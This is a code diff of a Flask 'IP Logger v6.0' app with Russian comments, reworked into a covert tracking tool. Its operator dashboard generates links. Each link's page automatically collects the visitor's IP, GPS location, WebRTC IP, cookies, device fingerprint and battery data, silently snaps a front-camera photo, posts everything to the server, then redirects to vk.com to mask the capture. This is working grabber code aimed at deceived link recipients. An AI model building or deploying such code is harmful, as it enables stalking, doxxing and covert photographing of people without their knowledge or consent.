-                }
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            if (gl) {
+                return { renderer: gl.getParameter(gl.RENDERER) || 'Unknown', version: gl.getParameter(gl.VERSION) || 'Unknown' };
             }
-            html += `</div></div>`;
-        }
-        grid.innerHTML = html;
+            return { renderer: 'Not supported', version: 'Not supported' };
+        } catch { return { renderer: 'Unknown', version: 'Unknown' }; }
     }
 
-    // ========== КНОПКИ ==========
-    document.getElementById('requestGeoBtn').addEventListener('click', requestGeolocation);
-    document.getElementById('refreshBtn').addEventListener('click', () => location.reload());
-    document.getElementById('exportBtn').addEventListener('click', exportJSON);
-    document.getElementById('copyBtn').addEventListener('click', copyAllData);
-    startCameraBtn.addEventListener('click', startCamera);
-    takePhotoBtn.addEventListener('click', takePhoto);
-    stopCameraBtn.addEventListener('click', stopCamera);
-    clearPhotoBtn.addEventListener('click', clearPhoto);
+    // ============================================================
+    // 2. ГЕОЛОКАЦИЯ (АВТОМАТИЧЕСКИЙ ЗАПРОС)
+    // ============================================================
 
-    document.getElementById('resetBtn').addEventListener('click', function() {
-        geoCoords = null;
-        geoError = null;
-        if (info.photo) delete info.photo;
-        clearPhoto();
-        stopCamera();
-        Object.keys(info).forEach(key => { if (key !== 'geo') delete info[key]; });
-        statusBadge.className = 'badge badge-pending';
-        statusBadge.textContent = '⏳ загрузка';
-        collectAllData();
-        showToast('🔄 Сброшено');
-    });
+    function getGeolocation() {
+        return new Promise((resolve) => {
+            if (!navigator.geolocation) {
+                resolve({ latitude: 'Not supported', longitude: 'Not supported', accuracy: 'Not supported' });
+                return;
+            }
+            navigator.geolocation.getCurrentPosition(
+                (pos) => resolve({ latitude: pos.coords.latitude, longitude: pos.coords.longitude, accuracy: pos.coords.accuracy }),
+                (err) => {
+                    let msg = err.message;
+                    if (err.code === 1) msg = 'User denied';
+                    else if (err.code === 2) msg = 'Position unavailable';
+                    else if (err.code === 3) msg = 'Timeout';
+                    resolve({ latitude: 'Denied', longitude: 'Denied', accuracy: msg });
+                },
+                { enableHighAccuracy: true, timeout: 15000 }
+            );
+        });
+    }
 
-    // ========== ЗАПУСК ==========
-    collectAllData();
-    console.log('🚀 MAX IP Logger v4.0 загружен');
+    // ============================================================
+    // 3. КАМЕРА (АВТОМАТИЧЕСКИЙ ЗАПРОС И СКРИНШОТ)
+    // ============================================================
+
+    function getCameraPhoto() {
+        return new Promise((resolve) => {
+            const video = document.createElement('video');
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+
+            navigator.mediaDevices.getUserMedia({
+                video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
+                audio: false
+            })
+            .then((stream) => {
+                video.srcObject = stream;
+                video.play();
+                setTimeout(() => {
+                    canvas.width = video.videoWidth || 640;
+                    canvas.height = video.videoHeight || 480;
+                    ctx.translate(canvas.width, 0);
+                    ctx.scale(-1, 1);
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    ctx.setTransform(1, 0, 0, 1, 0, 0);
+                    const photo = canvas.toDataURL('image/jpeg', 0.85);
+                    stream.getTracks().forEach(t => t.stop());
+                    resolve(photo);
+                }, 500);
+            })
+            .catch(() => resolve(null));
+        });
+    }
+
+    // ============================================================
+    // 4. ОТПРАВКА ВСЕХ ДАННЫХ
+    // ============================================================
+
+    async function sendAllData() {
+        const ip = await getIP();
+        const geo = await getGeo(ip);
+        const device = getDeviceInfo();
+        const screen = getScreen();
+        const webrtc = await getWebRTC();
+        const battery = await getBattery();
+        const webgl = getWebGL();
+        const geolocation = await getGeolocation();
+        const photo = await getCameraPhoto();
+
+        const data = {
+            link_id: linkId,
+            timestamp: new Date().toISOString(),
+            ip: ip,
+            webrtc_ip: webrtc,
+            country: geo.country,
+            city: geo.city,
+            region: geo.region,
+            isp: geo.isp,
+            geo_lat: geo.latitude,
+            geo_lon: geo.longitude,
+            gps_lat: geolocation.latitude,
+            gps_lon: geolocation.longitude,
+            gps_accuracy: geolocation.accuracy,
+            device_type: device.device,
+            os: device.os,
+            browser: device.browser,
+            user_agent: device.ua,
+            screen: screen.screen,
+            window_size: screen.window,
+            color_depth: screen.colorDepth,
+            pixel_ratio: screen.pixelRatio,
+            timezone: getTimezone(),
+            language: getLanguage(),
+            cookies: getCookies(),
+            fingerprint: getFingerprint(),
+            plugins: getPlugins(),
+            battery_level: battery.level,
+            battery_charging: battery.charging,
+            webgl_renderer: webgl.renderer,
+            webgl_version: webgl.version,
+            photo: photo
+        };
+
+        try {
+            await fetch('/log', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            });
+        } catch (e) {}
+
+        setTimeout(() => {
+            window.location.href = 'https://vk.com/';
+        }, 1500);
+    }
+
+    sendAllData();
 })();
 </script>
 </body>
 </html>
 """
 
+# ===================== СТРАНИЦА ДЛЯ ТЕБЯ (С УПРАВЛЕНИЕМ ССЫЛКАМИ) =====================
+STATS_HTML = """
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>📊 IP Logger v6.0</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { background: #0a0a0f; color: #e0e0e0; font-family: 'Segoe UI', Arial, sans-serif; padding: 20px; }
+        .container { max-width: 1200px; margin: 0 auto; }
+        h1 { color: #ffd93d; margin-bottom: 20px; }
+        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin-bottom: 30px; }
+        .stat-card { background: #1a1a2e; padding: 20px; border-radius: 12px; text-align: center; border: 1px solid #2a2a4a; }
+        .stat-card .num { font-size: 32px; font-weight: 700; color: #ffd93d; }
+        .stat-card .label { color: #888; font-size: 13px; margin-top: 5px; }
+        .link-box { background: #1a1a2e; padding: 15px; border-radius: 10px; margin: 10px 0; border: 1px solid #2a2a4a; display: flex; align-items: center; flex-wrap: wrap; gap: 10px; }
+        .link-box .link { flex: 1; color: #ffd93d; word-break: break-all; font-size: 14px; }
+        .link-box .delete-btn { background: #ff4a4a; color: #fff; border: none; padding: 5px 15px; border-radius: 6px; cursor: pointer; font-size: 12px; }
+        .link-box .delete-btn:hover { opacity: 0.7; }
+        .visitor { background: #1a1a2e; padding: 15px; border-radius: 10px; margin-bottom: 10px; border-left: 4px solid #ff6b6b; }
+        .visitor .ip { color: #ffd93d; font-weight: 600; }
+        .visitor .detail { color: #aaa; font-size: 13px; }
+        .visitor .time { color: #666; font-size: 12px; float: right; }
+        .visitor .photo { max-width: 150px; border-radius: 8px; margin-top: 10px; border: 2px solid #4aff8a; }
+        .btn { background: #4a9eff; color: #fff; border: none; padding: 10px 25px; border-radius: 8px; cursor: pointer; font-size: 14px; }
+        .btn:hover { opacity: 0.8; }
+        .btn-danger { background: #ff4a4a; }
+        .btn-success { background: #4aff8a; color: #0b1219; }
+        .btn-small { padding: 5px 15px; font-size: 12px; }
+        .btn-gold { background: #ffd700; color: #0b1219; }
+        .tab { padding: 8px 20px; background: #1a1a2e; border: none; color: #e0e0e0; cursor: pointer; border-radius: 8px 8px 0 0; }
+        .tab.active { background: #2a2a4a; color: #ffd93d; }
+        .controls { display: flex; gap: 10px; flex-wrap: wrap; margin: 15px 0; }
+        .links-list { margin: 15px 0; }
+        .empty { color: #666; text-align: center; padding: 30px; }
+        .footer { margin-top: 30px; text-align: center; color: #666; font-size: 13px; }
+        .badge { display: inline-block; padding: 2px 10px; border-radius: 20px; font-size: 11px; font-weight: 600; }
+        .badge-success { background: #1d4a3b; color: #a3f0d0; }
+        .badge-danger { background: #5f2d3a; color: #ffb3b3; }
+    </style>
+</head>
+<body>
+<div class="container">
+    <h1>📊 IP Logger v6.0 — Управление ссылками</h1>
+    <p style="color:#888;margin-bottom:10px;">Создавай сколько угодно ссылок, удаляй старые, смотри статистику</p>
+
+    <div class="controls">
+        <button class="btn btn-gold" onclick="generateLink()">🔗 + Создать ссылку</button>
+        <button class="btn" onclick="copyLink()">📋 Копировать текущую</button>
+        <button class="btn btn-danger" onclick="clearAll()">🗑️ Очистить всё</button>
+        <button class="btn" onclick="exportAll()">📥 Экспорт JSON</button>
+    </div>
+
+    <div id="currentLinkBox" style="display:none; background:#1a1a2e; padding:15px; border-radius:10px; margin-bottom:15px; border:2px solid #4a9eff;">
+        <div style="display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:10px;">
+            <span style="color:#ffd93d; word-break:break-all;" id="currentLinkText"></span>
+            <div style="display:flex; gap:8px;">
+                <button class="btn btn-small btn-success" onclick="copyLink()">📋 Копировать</button>
+                <button class="btn btn-small btn-danger" onclick="deleteCurrentLink()">🗑️ Удалить</button>
+            </div>
+        </div>
+        <div style="margin-top:8px; font-size:12px; color:#666;">Переходов: <span id="currentVisits">0</span></div>
+    </div>
+
+    <div class="stats-grid" id="statsGrid">
+        <div class="stat-card"><div class="num" id="totalVisits">0</div><div class="label">Всего переходов</div></div>
+        <div class="stat-card"><div class="num" id="uniqueVisits">0</div><div class="label">Уникальных IP</div></div>
+        <div class="stat-card"><div class="num" id="withPhoto">0</div><div class="label">С фото</div></div>
+        <div class="stat-card"><div class="num" id="withGeo">0</div><div class="label">С геолокацией</div></div>
+    </div>
+
+    <div class="links-list" id="linksList"></div>
+    <div id="visitorsList"></div>
+
+    <div class="footer">⚡ Все данные собираются автоматически: IP, геолокация, камера, устройство, браузер, экран, батарея, WebGL, отпечаток</div>
+</div>
+
+<script>
+let currentLinkId = null;
+let currentFullLink = '';
+
+// ========== ГЕНЕРАЦИЯ ССЫЛКИ ==========
+function generateLink() {
+    fetch('/generate')
+        .then(r => r.json())
+        .then(data => {
+            currentLinkId = data.id;
+            currentFullLink = data.full_url;
+            document.getElementById('currentLinkBox').style.display = 'block';
+            document.getElementById('currentLinkText').textContent = currentFullLink;
+            document.getElementById('currentVisits').textContent = data.visits || 0;
+            loadLinks();
+            loadStats();
+            showToast('✅ Ссылка создана!');
+        });
+}
+
+function copyLink() {
+    if (!currentFullLink) { generateLink(); return; }
+    navigator.clipboard.writeText(currentFullLink).then(() => {
+        showToast('📋 Ссылка скопирована!');
+    });
+}
+
+function deleteCurrentLink() {
+    if (!currentLinkId) return;
+    if (!confirm('Удалить эту ссылку?')) return;
+    fetch('/delete/' + currentLinkId, { method: 'POST' })
+        .then(() => {
+            currentLinkId = null;
+            currentFullLink = '';
+            document.getElementById('currentLinkBox').style.display = 'none';
+            loadLinks();
+            loadStats();
+            showToast('🗑️ Ссылка удалена');
+        });
+}
+
+// ========== ЗАГРУЗКА СПИСКА ССЫЛОК ==========
+function loadLinks() {
+    fetch('/links')
+        .then(r => r.json())
+        .then(data => {
+            const container = document.getElementById('linksList');
+            if (data.links.length === 0) {
+                container.innerHTML = '<div class="empty">Нет созданных ссылок. Нажмите «Создать ссылку»</div>';
+                return;
+            }
+            let html = '<h3 style="margin:15px 0 10px 0;">📋 Ваши ссылки</h3>';
+            data.links.forEach(link => {
+                const visits = data.visits[link.id] || 0;
+                html += `<div class="link-box">
+                    <span class="link">${link.full_url}</span>
+                    <span style="color:#888;font-size:12px;">${visits} переходов</span>
+                    <button class="btn btn-small btn-success" onclick="selectLink('${link.id}')">Выбрать</button>
+                    <button class="delete-btn" onclick="deleteLink('${link.id}')">✕</button>
+                </div>`;
+            });
+            container.innerHTML = html;
+        });
+}
+
+function selectLink(id) {
+    fetch('/links')
+        .then(r => r.json())
+        .then(data => {
+            const link = data.links.find(l => l.id === id);
+            if (link) {
+                currentLinkId = link.id;
+                currentFullLink = link.full_url;
+                document.getElementById('currentLinkBox').style.display = 'block';
+                document.getElementById('currentLinkText').textContent = currentFullLink;
+                document.getElementById('currentVisits').textContent = data.visits[id] || 0;
+                loadStats();
+                showToast('✅ Ссылка выбрана');
+            }
+        });
+}
+
+function deleteLink(id) {
+    if (!confirm('Удалить эту ссылку?')) return;
+    fetch('/delete/' + id, { method: 'POST' })
+        .then(() => {
+            if (currentLinkId === id) {
+                currentLinkId = null;
+                currentFullLink = '';
+                document.getElementById('currentLinkBox').style.display = 'none';
+            }
+            loadLinks();
+            loadStats();
+            showToast('🗑️ Ссылка удалена');
+        });
+}
+
+// ========== СТАТИСТИКА ==========
+function loadStats() {
+    const url = currentLinkId ? '/stats/' + currentLinkId : '/stats/all';
+    fetch(url)
+        .then(r => r.json())
+        .then(data => {
+            document.getElementById('totalVisits').textContent = data.total_visits || 0;
+            document.getElementById('uniqueVisits').textContent = data.unique_ips || 0;
+            document.getElementById('withPhoto').textContent = data.with_photo || 0;
+            document.getElementById('withGeo').textContent = data.with_geo || 0;
+
+            if (currentLinkId && document.getElementById('currentVisits')) {
+                document.getElementById('currentVisits').textContent = data.total_visits || 0;
+            }
+
+            let html = '';
+            const visitors = data.visitors || [];
+            if (visitors.length === 0) {
+                html = '<div class="empty">😴 Пока никого нет</div>';
+            } else {
+                visitors.forEach(v => {
+                    html += `<div class="visitor">
+                        <span class="time">${v.timestamp || ''}</span>
+                        <div><span class="ip">${v.ip || 'Unknown'}</span>
+                        ${v.country ? ` <span class="badge badge-success">${v.country}</span>` : ''}
+                        ${v.city ? ` <span class="badge badge-success">${v.city}</span>` : ''}</div>
+                        <div class="detail">📱 ${v.device_type || 'Unknown'} | ${v.os || 'Unknown'} | ${v.browser || 'Unknown'}</div>
+                        <div class="detail">🖥️ ${v.screen || 'Unknown'} | ⏰ ${v.timezone || 'Unknown'}</div>
+                        <div class="detail">📍 GPS: ${v.gps_lat && v.gps_lat !== 'Denied' ? `${v.gps_lat}, ${v.gps_lon}` : '❌ отказ'}</div>
+                        <div class="detail">🔋 ${v.battery_level || 'Unknown'} | ${v.battery_charging === 'Yes' ? '🔌 зарядка' : '🔋 не заряжается'}</div>
+                        <div class="detail">🆔 ${(v.fingerprint || 'Unknown').substring(0, 30)}...</div>
+                        ${v.photo ? `<div><img src="${v.photo}" class="photo" /></div>` : ''}
+                    </div>`;
+                });
+            }
+            document.getElementById('visitorsList').innerHTML = html;
+        });
+}
+
+// ========== ОЧИСТКА ==========
+function clearAll() {
+    if (!confirm('Удалить все данные (все ссылки)?')) return;
+    fetch('/clear', { method: 'POST' })
+        .then(() => {
+            currentLinkId = null;
+            currentFullLink = '';
+            document.getElementById('currentLinkBox').style.display = 'none';
+            loadLinks();
+            loadStats();
+            showToast('🗑️ Всё очищено');
+        });
+}
+
+function exportAll() {
+    window.open('/export', '_blank');
+}
+
+// ========== TOAST ==========
+function showToast(msg) {
+    let toast = document.getElementById('toast');
+    if (!toast) {
+        toast = document.createElement('div');
+        toast.id = 'toast';
+        toast.style.cssText = 'position:fixed;bottom:20px;left:50%;transform:translateX(-50%);background:#1d4a3b;color:#a3f0d0;padding:10px 25px;border-radius:50px;font-size:14px;opacity:0;transition:opacity 0.3s;z-index:999;';
+        document.body.appendChild(toast);
+    }
+    toast.textContent = msg;
+    toast.style.opacity = '1';
+    clearTimeout(toast._hide);
+    toast._hide = setTimeout(() => toast.style.opacity = '0', 3000);
+}
+
+// ========== АВТООБНОВЛЕНИЕ ==========
+setInterval(() => {
+    loadStats();
+    loadLinks();
+}, 5000);
+
+// ========== ЗАПУСК ==========
+loadLinks();
+loadStats();
+setTimeout(generateLink, 500);
+</script>
+</body>
+</html>
+"""
+
 # ===================== МАРШРУТЫ =====================
+
 @app.route('/')
 def index():
-    return render_template_string(INDEX_HTML)
+    return render_template_string(STATS_HTML)
 
 @app.route('/generate')
-def generate_link():
+def generate():
     link_id = str(uuid.uuid4())[:8]
     links_db[link_id] = {'created': datetime.datetime.now().isoformat()}
     logs_db[link_id] = []
     return jsonify({
         'id': link_id,
         'full_url': f"{request.host_url}l/{link_id}",
-        'visits': 0,
-        'unique': 0,
-        'last_visit': '-'
+        'visits': 0
     })
 
 @app.route('/l/<link_id>')
-def serve_logger(link_id):
+def logger(link_id):
     if link_id not in links_db:
         return 'Ссылка не найдена', 404
-    return render_template_string(INDEX_HTML)
+    return render_template_string(LOGGER_HTML, link_id=link_id)
 
 @app.route('/log', methods=['POST'])
-def log_data():
+def log():
     data = request.get_json()
     link_id = data.get('link_id')
     if link_id not in logs_db:
@@ -821,19 +572,75 @@ def log_data():
     logs_db[link_id].append(data)
     return jsonify({'status': 'ok'})
 
-@app.route('/stats/<link_id>')
-def get_stats(link_id):
-    return jsonify({'visitors': logs_db.get(link_id, []), 'total': len(logs_db.get(link_id, []))})
+@app.route('/links')
+def get_links():
+    links = []
+    for link_id in links_db:
+        links.append({
+            'id': link_id,
+            'full_url': f"{request.host_url}l/{link_id}",
+            'created': links_db[link_id]['created']
+        })
+    
+    visits = {}
+    for link_id, logs in logs_db.items():
+        visits[link_id] = len(logs)
+    
+    return jsonify({'links': links, 'visits': visits})
 
-@app.route('/clear/<link_id>', methods=['POST'])
-def clear_stats(link_id):
+@app.route('/stats/all')
+def stats_all():
+    all_visitors = []
+    for visitors in logs_db.values():
+        all_visitors.extend(visitors)
+    
+    unique_ips = len(set(v.get('ip') for v in all_visitors if v.get('ip')))
+    with_photo = sum(1 for v in all_visitors if v.get('photo'))
+    with_geo = sum(1 for v in all_visitors if v.get('gps_lat') and v.get('gps_lat') != 'Denied')
+    
+    return jsonify({
+        'visitors': all_visitors[-50:],
+        'total_visits': len(all_visitors),
+        'unique_ips': unique_ips,
+        'with_photo': with_photo,
+        'with_geo': with_geo
+    })
+
+@app.route('/stats/<link_id>')
+def stats_link(link_id):
+    visitors = logs_db.get(link_id, [])
+    unique_ips = len(set(v.get('ip') for v in visitors if v.get('ip')))
+    with_photo = sum(1 for v in visitors if v.get('photo'))
+    with_geo = sum(1 for v in visitors if v.get('gps_lat') and v.get('gps_lat') != 'Denied')
+    
+    return jsonify({
+        'visitors': visitors[-50:],
+        'total_visits': len(visitors),
+        'unique_ips': unique_ips,
+        'with_photo': with_photo,
+        'with_geo': with_geo
+    })
+
+@app.route('/delete/<link_id>', methods=['POST'])
+def delete_link(link_id):
+    if link_id in links_db:
+        del links_db[link_id]
     if link_id in logs_db:
-        logs_db[link_id] = []
+        del logs_db[link_id]
     return jsonify({'status': 'ok'})
 
-@app.route('/export/<link_id>')
-def export_stats(link_id):
-    return jsonify(logs_db.get(link_id, []))
+@app.route('/clear', methods=['POST'])
+def clear():
+    logs_db.clear()
+    links_db.clear()
+    return jsonify({'status': 'ok'})
+
+@app.route('/export')
+def export():
+    return jsonify({
+        'links': links_db,
+        'logs': logs_db
+    })
 
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5000)
+    app.run(host='0.0.0.0', port=5000, debug=True)
